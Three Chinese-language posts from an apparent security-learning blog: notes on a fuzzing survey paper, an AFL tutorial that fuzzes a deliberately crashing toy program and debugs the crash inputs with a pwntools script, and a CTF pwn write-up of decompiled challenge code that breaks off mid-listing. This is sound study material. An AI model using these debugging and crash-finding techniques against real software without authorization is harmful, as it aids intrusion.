<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Fuzzing: Art, Science, and Engineering论文阅读</title>
      <link href="/2023/10/17/fuzzing-art-science-and-engineering%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/"/>
      <url>/2023/10/17/fuzzing-art-science-and-engineering%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><p>原论文地址:<a href="https://arxiv.org/pdf/1812.00140.pdf">https://arxiv.org/pdf/1812.00140.pdf</a><br>由于本人的英文水平实在是太垃圾了 所以用的是谷歌机翻看的<br>部分语句可能由于机翻带来的影响导致语义错误</p><h1 id="Abstract"><a href="#Abstract" class="headerlink" title="Abstract"></a>Abstract</h1><p>模糊测试是一种概念简单 部署门槛低 且成效显著的漏洞发现技术<br>本文的目的旨在帮助保存大量的模糊测试样例以及保证其连贯性 提出一个统一的通用模型</p><h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>作者简单介绍了fuzz是什么 以及此前其存在的缺陷 同时举了几个比赛队伍或者厂商使用FUZZ的案例  随后简要概括了fuzz社区的规模<br>因为fuzz的逐渐发展 导致了各种fuzz工具之间的术语存在明显的“歧义”(fragmentation)<br>作者认为 这种歧义很有可能会阻碍fuzz的传播  影响到fuzz的发展<br>所以 其认为有必要巩固和提炼模糊测试的进展 </p><h1 id="SYSTEMIZATION-TAXONOMY-AND-TEST-PRO-GRAMS"><a href="#SYSTEMIZATION-TAXONOMY-AND-TEST-PRO-GRAMS" class="headerlink" title="SYSTEMIZATION, TAXONOMY, AND TEST PRO-GRAMS"></a>SYSTEMIZATION, TAXONOMY, AND TEST PRO-GRAMS</h1><p>介绍了模糊测试最开始的提出者以及其最开始的定义 列举了模糊测试可适用的领域 接着为了使得大量模糊测试文献中的用语系统化 作者决定介绍一个由现代用途中提取的术语</p><h2 id="1-Fuzzing-Fuzz-Testing"><a href="#1-Fuzzing-Fuzz-Testing" class="headerlink" title="1.Fuzzing &amp; Fuzz Testing"></a>1.Fuzzing &amp; Fuzz Testing</h2><p>本小节针对模糊测试下了第一个定义</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Definition 1 (Fuzzing). Fuzzing is the execution of the PUTusing input(s) sampled from an input space (the “fuzz inputspace”) that protrudes the expected input space of the PUT.</span><br><span class="line">这里的put是program under test</span><br></pre></td></tr></table></figure><p>此外还针对fuzz testing和fuzz进行了一个定义<br>作者认为fuzz testing是一种利用fuzz的软件测试技术 其的特定目标是用来查找和安全有关的错误 包括程序崩溃</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Definition 2 (Fuzz Testing). Fuzz testing is the use of fuzzing</span><br><span class="line">to test if a PUT violates a security policy.</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Definition 3 (Fuzzer). A fuzzer is a program that performs</span><br><span class="line">fuzz testing on a PUT.</span><br></pre></td></tr></table></figure><p>此外还定义了fuzz compaign</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Definition 4 (Fuzz Campaign). A fuzz campaign is a specific</span><br><span class="line">execution of a fuzzer on a PUT with a specific security</span><br><span class="line">policy.</span><br></pre></td></tr></table></figure><p>早期的模糊测试活动 其安全策略只局限于测试输入 使PUT崩溃 但是模糊测试活动可以用于测试执行中观察到的任何安全策略 而这一决定执行是否违反安全策略的称为漏洞预测器</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Definition 5 (Bug Oracle). A bug oracle is a program, per-</span><br><span class="line">haps as part of a fuzzer, that determines whether a given</span><br><span class="line">execution of the PUT violates a specific security policy.</span><br></pre></td></tr></table></figure><p>这一段话有点没看懂 目前还不能理解执行中观察到的任何安全策略的含义 除了输入点可以诱发的崩溃 还有什么呢 笔者于这里提出了第一个疑问<br>作者称由模糊器实现的算法为模糊算法 模糊参数是依赖于PUT之外的一些参数 称其为模糊配置 笔者这里将其理解为 模糊参数于PUT不相干 是否可以认为是一种用于模糊测试的语料库</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Definition 6 (Fuzz Configuration). A fuzz configuration of</span><br><span class="line">a fuzz algorithm comprises the parameter value(s) that</span><br><span class="line">control(s) the fuzz algorithm.</span><br></pre></td></tr></table></figure><p>接着针对模糊算法进行了进一步的说明 作者认为模糊算法的定义是广泛的 复杂的模糊配置会随着时间的推移而演变其算法 引入了突变率和种子的概念<br>种子是用来生成输入PUT的测试用例<br>而种子的集合则成为种子池 复杂的模糊配置就会演变种子池<br>作者举了一个基于覆盖率引导的模糊测试例子 其会在每个配置中存储已经达到的覆盖率信息<br>笔者这里经过查阅资料(其实是询问gpt 大致了解了覆盖率是一种什么概念<br>覆盖率引导是一种模糊测试的技术策略 其主要目的是用来寻找最优的测试用例 该测试用例可以经过最多的代码分支 经过的代码占总代码的百分比就是覆盖率<br>那么这里就是一种迭代的过程 会根据上一次的模糊测试返回的覆盖率 来决定下一次的种子 从而使其获得更大的覆盖率</p><h2 id="2-Paper-Selection-Criteria"><a href="#2-Paper-Selection-Criteria" class="headerlink" title="2.Paper Selection Criteria"></a>2.Paper Selection Criteria</h2><p>这一小节 主要是作者声明了收纳出版物的范围 举了几个会议的名称<br>同时引入了黑盒白盒的概念(并未由作者提出 为笔者根据段落大意可以看出)<br>作者认为 以安全为特定目标的模糊测试和软件测试相比 从理论来说 二者的不同点只体现在漏洞预测器的区别(bug oracle)<br>接着作者提到 在实际中 软件测试的前提是知晓源代码 而且测试人对于PUT有更多的了解<br>而模糊测试更可能是被PUT开发者以外的人使用 其不知晓上述信息<br>由于这二者领域仍然密切相关 所以作者决定 只要出版物出现模糊(fuzz)一次 就纳入其中</p><h2 id="3-Fuzz-Testing-Algorithm"><a href="#3-Fuzz-Testing-Algorithm" class="headerlink" title="3.Fuzz Testing Algorithm"></a>3.Fuzz Testing Algorithm</h2><p>本节作者提供了一个算法1<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310192020010.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310192020010.png" alt="image.png"></a><br>其采用一组模糊配置C以及Tlimit(最大时间限制)作为输入<br>输出一组已发现的错误<br>其由两部分组成 第一部分为预处理(preprocess)函数构成 该函数在模糊测试开始时执行<br>第二部分为由五个功能组成的循环 但不是所有的模糊器都全是这五个功能<br>称这个循环的每次运行为模糊迭代 每次inputeval将模糊样例输入给PUT称为模糊运行</p><h3 id="PREPROCESS-C-C"><a href="#PREPROCESS-C-C" class="headerlink" title="PREPROCESS(C)-&gt;C"></a>PREPROCESS(C)-&gt;C</h3><p>用户向P提供一组模糊配置 其可能返回一组已修改的模糊配置<br>根据模糊算法的不同 P可以执行各种各样的操作 比如插入测试代码到PUT中<br>或者测量种子文件的执行速度</p><h3 id="SCHEDULE-C-Telapsed-Tlimit-conf"><a href="#SCHEDULE-C-Telapsed-Tlimit-conf" class="headerlink" title="SCHEDULE(C,Telapsed,Tlimit)-&gt;conf"></a>SCHEDULE(C,Telapsed,Tlimit)-&gt;conf</h3><p>将一组模糊配置C 最大时间限制 经过的时间作为参数输入 其会返回一个用于当前模糊迭代的模糊配置<br>这句话笔者有点没看懂 是意味着该功能负责实现模糊配置的迭代?<br>不过作者说详细看2.4节 所以这里暂且留一个疑问</p><h3 id="INPUTGEN-conf-tcs"><a href="#INPUTGEN-conf-tcs" class="headerlink" title="INPUTGEN(conf)-&gt;tcs"></a>INPUTGEN(conf)-&gt;tcs</h3><p>这个功能输入一个当前模糊配置 根据模糊器的不同 会选择模糊配置中的种子 又或者是模型或语法作为参数 以此来输出模糊测试的样例<br>笔者这里对于模型和语法是什么东西 还没有概念 先继续往下看</p><h3 id="INPUTEVAL-conf-tcs-0bug-B-execinfos"><a href="#INPUTEVAL-conf-tcs-0bug-B-execinfos" class="headerlink" title="INPUTEVAL(conf,tcs,0bug)-&gt;B,execinfos"></a>INPUTEVAL(conf,tcs,0bug)-&gt;B,execinfos</h3><p>接收当前模糊配置conf 模糊测试样例 以及漏洞预测器作为参数<br>该功能用于判断PUT是否违反了安全策略<br>结束后会输出一个漏洞合集B 以及execinfos 用来迭代模糊配置</p><h3 id="CONFUPDATE-C-conf-execinfos-C"><a href="#CONFUPDATE-C-conf-execinfos-C" class="headerlink" title="CONFUPDATE(C,conf,execinfos)-&gt;C"></a>CONFUPDATE(C,conf,execinfos)-&gt;C</h3><p>接收模糊配置C 当前模糊配置conf execinfos作为参数<br>该功能用来更新模糊配置C</p><h3 id="CONTINUE-C-True-False"><a href="#CONTINUE-C-True-False" class="headerlink" title="CONTINUE(C)-&gt;{True,False}"></a>CONTINUE(C)-&gt;{True,False}</h3><p>该功能用来接收当前模糊配置 并且进行判断是否进行模糊迭代<br>如果没有新的路径可发现 其就可以终止执行</p><h2 id="4-Taxonomy-of-Fuzzers"><a href="#4-Taxonomy-of-Fuzzers" class="headerlink" title="4.Taxonomy of Fuzzers"></a>4.Taxonomy of Fuzzers</h2><p>本节 作者对于模糊器的分类进行了定义 分为了三种 黑盒 白盒 灰盒<br>同时 这与传统的软件测试分类不同 灰盒是作为白盒的变体</p><h3 id="Black-box-Fuzzer"><a href="#Black-box-Fuzzer" class="headerlink" title="Black-box Fuzzer"></a>Black-box Fuzzer</h3><p>黑盒适用于模糊测试以及软件测试中 表示测试者无法看到PUT的内部结构 只能看到PUT的输入输出 大部分的模糊器都属于这一类<br>现代的部分模糊器 在考虑输入的结构信息以此来生成更有意义的测试样例的同时 也会保证不检查PUT</p><h3 id="White-box-Fuzzer"><a href="#White-box-Fuzzer" class="headerlink" title="White-box Fuzzer"></a>White-box Fuzzer</h3><p>白盒测试是指在进行模糊测试的时候 已经了解了PUT的内部结构和逻辑<br>接着作者提到 白盒测试一词最早的提及是动态符号执行DSE<br>普通的符号执行是指利用符号值而非输入值来分析执行路径<br>而动态符号执行中 符号执行和具体执行路径同时运行 根据PUT的状态和具体输入的数据来简化符号约束条件<br>在简化符号约束条件中 可以将符号值转化为具体的值 例如将符号执行的系统调用转化为实际的系统调用<br>上述的符号值表示的概念 按笔者的理解 应该是用例如符号’a’这样的字符来代替具体的值例如’6’ 类似于数学中一元方程的x<br>随后 作者还提到 白盒测试通常来用来描述污点分析的模糊器<br>笔者查询得知 污点分析中的污点是指不受信任的输入源进入PUT的数据 通常是用户输入<br>通过模糊器生成污点数据 可以模拟潜在的攻击场景 检测PUT是否在处理污点数据的时候存在安全隐患<br>作者提到 由于白盒测试需要进行动态检测和smt求解 所以相比黑盒测试 所需要的开销会更多</p><h3 id="Grey-box-Fuzzer"><a href="#Grey-box-Fuzzer" class="headerlink" title="Grey-box Fuzzer"></a>Grey-box Fuzzer</h3><p>灰盒测试位于白盒和黑盒之间  模糊器可以获得PUT的一部分内部信息<br>与白盒模糊器相比 灰盒不会推理PUT的完整语义<br>笔者认为 这里的完整语义是指 PUT的内部逻辑 数据流 控制流以及外部的交互等等<br>作者提到 灰盒测试可以对PUT进行轻量的静态分析或者收集其执行的动态信息 比如代码覆盖率</p><h2 id="5-Fuzzer-Genealogy-and-Overview"><a href="#5-Fuzzer-Genealogy-and-Overview" class="headerlink" title="5.Fuzzer Genealogy and Overview"></a>5.Fuzzer Genealogy and Overview</h2><p>暂时看不下去了 断更。。。</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> extra </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>FUZZ学习</title>
      <link href="/2023/10/17/fuzz%E5%AD%A6%E4%B9%A0/"/>
      <url>/2023/10/17/fuzz%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>对于FUZZ的大名早有耳闻 今天终于开始正式学习这一知识<br>水平有限 本篇文章可能部分地方存在描述错误等问题<br>本篇文章使用AFL模糊器<br>参考文章:<a href="https://thinkycx.me/2019-01-28-a-simple-AFL-tutorial-for-beginners.html">https://thinkycx.me/2019-01-28-a-simple-AFL-tutorial-for-beginners.html</a></p><h1 id="什么是FUZZ"><a href="#什么是FUZZ" class="headerlink" title="什么是FUZZ"></a>什么是FUZZ</h1><p>为了弄清楚FUZZ的概念 拜读了《Fuzzing: Art, Science, and Engineering》这篇经典的论文 如果有想看我阅读后总结的 可以去看另外一篇博客 这里就简单概述<br>FUZZ相比传统的软件测试 其包含的漏洞预测器用于决定测试过程中是否违反了安全策略<br>二者的目的性不一样 而FUZZ又分为三种 白盒 黑盒 灰盒 三者最大的差别在于模糊器对于PUT(待测程序)的了解程度有多少 是否知晓PUT的内部逻辑等<br>FUZZ采用模糊算法来生成随机的测试样例 部分复杂的模糊配置可以演变种子池来迭代测试样例 通常依靠代码覆盖率(即PUT执行路径)</p><h1 id="配置FUZZ环境"><a href="#配置FUZZ环境" class="headerlink" title="配置FUZZ环境"></a>配置FUZZ环境</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget http://lcamtuf.coredump.cx/afl/releases/afl-latest.tgz</span><br><span class="line">tar xvf afl-latest.tgz</span><br><span class="line">cd afl-2.52b</span><br><span class="line">sudo make &amp;&amp; sudo make install</span><br></pre></td></tr></table></figure><p>上述是afl的安装 我个人建议是使用afl++ 不过本篇文章均采用afl</p><h1 id="第一次FUZZ"><a href="#第一次FUZZ" class="headerlink" title="第一次FUZZ"></a>第一次FUZZ</h1><p>我们先来自己编写一个程序 逻辑很简单 输入对应的字符串就触发段错误</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;signal.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">int main(int argc, char *argv[]) &#123;</span><br><span class="line">    char buf[100];</span><br><span class="line">    scanf(&quot;%s&quot;,buf);</span><br><span class="line">    char buf1[] = &quot;aaaa&quot;;</span><br><span class="line">    if(!strcmp(buf,buf1))&#123;</span><br><span class="line">        printf(&quot;success!\n&quot;);</span><br><span class="line">        raise(SIGSEGV);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        printf(&quot;faile\n&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>随便创建两个空目录 一个用来存放测试样例  一个用来存放输出信息<br>本次模糊测试 测试样例由我们自己填写<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310242045496.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310242045496.png" alt="image.png"></a><br>随后使用-i指定前者 -o指定后者 开始fuzz</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">afl-fuzz -i ./fuzz/in -o ./fuzz/out ./test</span><br></pre></td></tr></table></figure><p>当然了 如果你使用的是afl 那么你就会发现 模糊器读取到第二个样例的时候就终止了<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310242047047.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310242047047.png" alt="image.png"></a><br>原因在于afl的测试样例貌似不能直接导致PUT触发crash<br>所以这里更改第二个样例 使其为aaa 让模糊器使其迭代 延伸成aaaa这个字符串<br>随后重新开始fuzz 发现成功找到了三个crash<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310242131457.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310242131457.png" alt="image.png"></a></p><p>看到官方文档说 如果要让模糊器运行完毕 需要几个小时到一周左右 所以这里直接ctrl+c终止了<br>官方文档提到</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">crashes/ - unique test cases that cause the tested program to receive a fatal signal (e.g., SIGSEGV, SIGILL, SIGABRT). The entries are grouped by the received signal.</span><br></pre></td></tr></table></figure><p>所以去crashes目录下找到了三个触发崩溃的样例<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310242131539.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310242131539.png" alt="image.png"></a><br>第一个不出所料 是我们原定的字符串aaaa 第二个和第三个有点意外 貌似也是一些无规则字节 打算动调来看看 利用hexdump获取一下16进制格式的ascii字节码<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310242151963.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310242151963.png" alt="image.png"></a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">\x68\x68\x68\x68\x32\x00\x00\x68\xC6\xC6\xC6\xC6\xC6\xC6\xC6\xC6\xC6\xC6\xC6\xC6\xC6\xC6\xC6\xC6\xCE\xC6\xC6\xC6\xC6\xC6\xC6\xC6\xC6\x68\x87\x68\xE8\x00\x10\x68\x7F\xFF\xF0\xF0\xF0\xF0\xF0\xCF\xF0\xF0\xF0\xE4\xF0\xF0\xF0\x70\xF0\x68\x68\x68\x68\x32\x68\x68\x68\x68\x68\x68\xE8\x68\x68\x68\x68\xF0\xF0\xF0\xF0\xF0\xF0\xCF\xF0\xF0\xF0\xF0\x68\x68\xF0\xE9\xF0\xF0\xFB\xF0\xCF\xF0\xF0\xF0\xF0\xF0\xF0\x07\x70\xF0\x68\x68\x68\x68\x68\x68\x68\x6E\x00\x00\x01\x00\x70\xF0\x68\x68\x68\x68\x68\x68\x68\x68\x68\x68\xDF\xD1</span><br></pre></td></tr></table></figure><p>调试exp:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">io = process(&quot;./test&quot;)</span><br><span class="line">elf = ELF(&quot;./test&quot;)</span><br><span class="line">context.arch = &quot;amd64&quot;</span><br><span class="line">context.log_level = &quot;debug&quot;</span><br><span class="line">context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = &quot;\x68\x68\x68\x68\x32\x00\x00\x68\xC6\xC6\xC6\xC6\xC6\xC6\xC6\xC6\xC6\xC6\xC6\xC6\xC6\xC6\xC6\xC6\xCE\xC6\xC6\xC6\xC6\xC6\xC6\xC6\xC6\x68\x87\x68\xE8\x00\x10\x68\x7F\xFF\xF0\xF0\xF0\xF0\xF0\xCF\xF0\xF0\xF0\xE4\xF0\xF0\xF0\x70\xF0\x68\x68\x68\x68\x32\x68\x68\x68\x68\x68\x68\xE8\x68\x68\x68\x68\xF0\xF0\xF0\xF0\xF0\xF0\xCF\xF0\xF0\xF0\xF0\x68\x68\xF0\xE9\xF0\xF0\xFB\xF0\xCF\xF0\xF0\xF0\xF0\xF0\xF0\x07\x70\xF0\x68\x68\x68\x68\x68\x68\x68\x6E\x00\x00\x01\x00\x70\xF0\x68\x68\x68\x68\x68\x68\x68\x68\x68\x68\xDF\xD1&quot;</span><br><span class="line">gdb.attach(io,&#x27;b *$rebase(0x1244)&#x27;)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">pause()</span><br></pre></td></tr></table></figure><p>在程序执行到pthread_kill函数后 回溯一下执行流 发现了检查canary的函数<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310242207740.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310242207740.png" alt="image.png"></a><br>应该是由于栈溢出触发的crash<br>那么接下来来看第三个<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310242208078.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310242208078.png" alt="image.png"></a><br>看这个长度应该也是因为栈溢出导致的crash 那么这里就不进一步动调了</p><h1 id="一些自己的研究"><a href="#一些自己的研究" class="headerlink" title="一些自己的研究"></a>一些自己的研究</h1><p>本小节用来记录自己对于afl官方文档阅读后的理解和实操  没啥重要性<br>文档中粗略介绍了afl所采用的模糊算法</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> extra </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>2023柏鹭杯</title>
      <link href="/2023/10/13/2023%E6%9F%8F%E9%B9%AD%E6%9D%AF/"/>
      <url>/2023/10/13/2023%E6%9F%8F%E9%B9%AD%E6%9D%AF/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>算是这三个月以来第一次打比赛 生疏了很多 然后两题pwn的考点都在代码审计能力<br>我刚好这方面十分薄弱 所以在赛后借助这两题准备进行一次细致的代审</p><p>同时 文中出现的函数名大部分都是我自己重命名过的 所以不一样不用担心ida解析问题</p><h1 id="eval"><a href="#eval" class="headerlink" title="eval"></a>eval</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall main(int a1, char **a2, char **a3)</span><br><span class="line">&#123;</span><br><span class="line">  char v4[160]; // [rsp+10h] [rbp-1B0h] BYREF</span><br><span class="line">  char v5[264]; // [rsp+B0h] [rbp-110h] BYREF</span><br><span class="line">  unsigned __int64 v6; // [rsp+1B8h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(0x28u);</span><br><span class="line">  setbuf(stdin, 0LL);</span><br><span class="line">  setbuf(stdout, 0LL);</span><br><span class="line">  setbuf(stderr, 0LL);</span><br><span class="line">  alarm(0x1Eu);</span><br><span class="line">  while ( recv_data(v5, 0x100uLL) )</span><br><span class="line">    vuln(v5, v4);</span><br><span class="line">  return 0LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>main函数就是清空缓冲区以及设置闹钟 同时使用了一个while循环<br>先跟进一下recv_data这个函数</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall sub_9D6(void *a1, size_t a2)</span><br><span class="line">&#123;</span><br><span class="line">  __int64 v3; // rax</span><br><span class="line">  char buf; // [rsp+1Fh] [rbp-11h] BYREF</span><br><span class="line">  __int64 v6; // [rsp+20h] [rbp-10h]</span><br><span class="line">  unsigned __int64 v7; // [rsp+28h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v7 = __readfsqword(0x28u);</span><br><span class="line">  v6 = 0LL;</span><br><span class="line">  memset(a1, 0, a2);</span><br><span class="line">  while ( a2 &gt; v6 + 1 &amp;&amp; read(0, &amp;buf, 1uLL) != -1 &amp;&amp; buf != 10 )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( !check_opt(buf) &amp;&amp; !check_number(buf) )</span><br><span class="line">      error();</span><br><span class="line">    v3 = v6++;</span><br><span class="line">    *(a1 + v3) = buf;</span><br><span class="line">  &#125;</span><br><span class="line">  return v6;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过单次输入一个字节 随后对该字节进行判断 是否为数字或者运算符 然后存储到a1中<br>随后来看一下vuln函数</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int __fastcall vuln(__int64 buf, _QWORD *a2)</span><br><span class="line">&#123;</span><br><span class="line">  char v3; // [rsp+1Fh] [rbp-11h]</span><br><span class="line">  __int64 buf2; // [rsp+20h] [rbp-10h]</span><br><span class="line">  __int64 i; // [rsp+28h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  memset(a2, 0, 0xA0uLL);</span><br><span class="line">  buf2 = buf;</span><br><span class="line">  for ( i = 0LL; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = *(buf + i);</span><br><span class="line">    if ( !check_opt(v3) )                       // 如果不是opt就返回0 即退出for循环</span><br><span class="line">      break;</span><br><span class="line">    deal_number(a2, buf2, i + buf);</span><br><span class="line">    if ( !check_number(*(i + 1 + buf)) )</span><br><span class="line">      error();</span><br><span class="line">    sub_CB1(a2, v3);</span><br><span class="line">    buf2 = i + 1 + buf;</span><br><span class="line">LABEL_8:</span><br><span class="line">    ;</span><br><span class="line">  &#125;</span><br><span class="line">  if ( v3 )</span><br><span class="line">    goto LABEL_8;</span><br><span class="line">  deal_number(a2, buf2, i + buf);</span><br><span class="line">  while ( *a2 )</span><br><span class="line">    calc(a2);</span><br><span class="line">  return printf(&quot;%ld\n&quot;, a2[a2[3] + 3]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的逻辑稍微复杂一点<br>仍然是一个逐字节处理 只有是操作符才能执行for循环中的函数<br>来跟进一下deal_number函数</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">_BYTE *__fastcall sub_DC9(__int64 a1, const char *buf2, _BYTE *opt)</span><br><span class="line">&#123;</span><br><span class="line">  _BYTE *result; // rax</span><br><span class="line">  __int64 v4; // rax</span><br><span class="line">  __int64 v5; // rcx</span><br><span class="line">  char old_opt; // [rsp+27h] [rbp-9h]</span><br><span class="line">  _BYTE *first_number; // [rsp+28h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  if ( *buf2 == &#x27;0&#x27; )</span><br><span class="line">    error();</span><br><span class="line">  old_opt = *opt;</span><br><span class="line">  *opt = 0;</span><br><span class="line">  first_number = strtol(buf2, 0LL, 10);</span><br><span class="line">  result = opt;</span><br><span class="line">  *opt = old_opt;</span><br><span class="line">  if ( first_number )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = *(a1 + 24);</span><br><span class="line">    *(a1 + 24) = v4 + 1;</span><br><span class="line">    v5 = v4 + 4;</span><br><span class="line">    result = first_number;</span><br><span class="line">    *(a1 + 8 * v5) = first_number;</span><br><span class="line">  &#125;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先判断了是否为0 是则终止程序<br>随后利用strtol将字符串转化为长整型 存储在a1+32处 同时a1+24处自增1 当然这是第一次处理的情况 后面由于a1+24的值不为0了  所以数字存储的地址也会相应增加一个字长<br>sub_cb1函数是一个对于运算符的检查以及筛分后运算</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall sub_CB1(_QWORD *a1, char opt)</span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; // rax</span><br><span class="line"></span><br><span class="line">  if ( !*a1 )</span><br><span class="line">  &#123;</span><br><span class="line">    result = (*a1)++;</span><br><span class="line">    *(a1 + result + 8) = opt;</span><br><span class="line">    return result;</span><br><span class="line">  &#125;</span><br><span class="line">  if ( opt != &#x27;+&#x27; )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( opt &lt;= &#x27;+&#x27; )</span><br><span class="line">    &#123;</span><br><span class="line">      if ( opt != &#x27;*&#x27; )                         // 这边是*的跳转</span><br><span class="line">LABEL_16:</span><br><span class="line">        error();</span><br><span class="line">      goto LABEL_8;</span><br><span class="line">    &#125;</span><br><span class="line">    if ( opt != &#x27;-&#x27; )</span><br><span class="line">    &#123;</span><br><span class="line">      if ( opt != &#x27;/&#x27; )</span><br><span class="line">        goto LABEL_16;</span><br><span class="line">LABEL_8:</span><br><span class="line">      if ( sub_91A(*(a1 + *a1 + 7)) )           // *(a1 + *a1 + 7)也就是运算符 sub_91A用来进一步检查是否为*和/</span><br><span class="line">        calc(a1);</span><br><span class="line">      if ( *a1 &gt; 0xEuLL )</span><br><span class="line">        error();</span><br><span class="line">      result = (*a1)++;</span><br><span class="line">      *(a1 + result + 8) = opt;</span><br><span class="line">      return result;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  calc(a1);</span><br><span class="line">  if ( *a1 &gt; 0xEuLL )</span><br><span class="line">    error();</span><br><span class="line">  result = (*a1)++;</span><br><span class="line">  *(a1 + result + 8) = opt;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>随后calc函数应该很容易就能看出来是干啥的 这里的a1数组后面我们再仔细分析</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">_QWORD *__fastcall sub_AC7(_QWORD *a1)</span><br><span class="line">&#123;</span><br><span class="line">  _QWORD *result; // rax</span><br><span class="line">  int opt; // eax</span><br><span class="line"></span><br><span class="line">  result = *a1;</span><br><span class="line">  if ( *a1 )</span><br><span class="line">  &#123;</span><br><span class="line">    opt = *(a1 + --*a1 + 8);</span><br><span class="line">    if ( opt == &#x27;+&#x27; )</span><br><span class="line">    &#123;</span><br><span class="line">      a1[a1[3] + 2] += a1[a1[3] + 3];           // a1[a1[3] + 2]为第一个number</span><br><span class="line">    &#125;</span><br><span class="line">    else if ( opt &gt; &#x27;+&#x27; )</span><br><span class="line">    &#123;</span><br><span class="line">      if ( opt == &#x27;-&#x27; )</span><br><span class="line">      &#123;</span><br><span class="line">        a1[a1[3] + 2] -= a1[a1[3] + 3];</span><br><span class="line">      &#125;</span><br><span class="line">      else</span><br><span class="line">      &#123;</span><br><span class="line">        if ( opt != 